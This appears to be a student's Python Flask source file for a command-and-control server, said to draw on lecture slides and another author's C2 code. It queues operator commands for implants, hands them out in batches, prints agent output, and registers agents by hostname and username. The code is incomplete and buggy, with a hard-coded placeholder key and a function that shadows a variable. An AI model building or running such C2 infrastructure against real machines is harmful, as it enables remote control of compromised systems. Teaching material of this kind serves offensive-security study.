##from lecture slides, refrenced 0xRick c2 code

import sqlite3
from flask import Flask, request, jsonify
import threading
import os, sys, random, string
from app.models.agent import agents
import multiprocessing as mp
from multiprocessing import Process
import requests 
from app.app import createFlaskApp


"""控制端表"""

c2_server = "http://127.0.0.1:8080"
lock = mp.Lock()
implant_lock = mp.Lock()
TASKS = []
AGENTS = []
path = "data/listeners/{__name__}/"

createflask = createFlaskApp()
app = createflask.create_app()
encryptionkey = None


@app.route("/tasks", methods=["GET"])
def download_tasks():
    global TASKS
    lock.acquire()
    try:
        batch = "\n".join(TASKS[:5])
        TASKS = TASKS[5:]
    finally:
        lock.release()
    return batch 

@app.route("/response", methods=["POST"])
def print_response():
    print(request.data.decode())
    return ""

@app.route("/queue")
def print_queue():
    return jsonify(TASKS)

@app.route("/secret", methods=["POST"])
def add_request():
    r = request.json
    lock.acquire()
    try:
        for cmd in r:
            TASKS.append(cmd)
    finally:
        lock.release()
    print("Queued up ", r)
    return "True"

@app.route("/register", methods=['POST', 'GET'])
def addAgent(client_id):
    guid, hostname, username = request.get_json()
    agent = agents(guid, hostname, username, encryptionkey)
    #addtodatabase(agent)
    return encryptionkey

def encryptionkey():
    #if encryptionkey == None:
    #    encryptionkey = getencryptionkey()
    encryptionkey = "blahblahblah"
    return encryptionkey

    
    
    
    
    
    
    
    
    
    
    
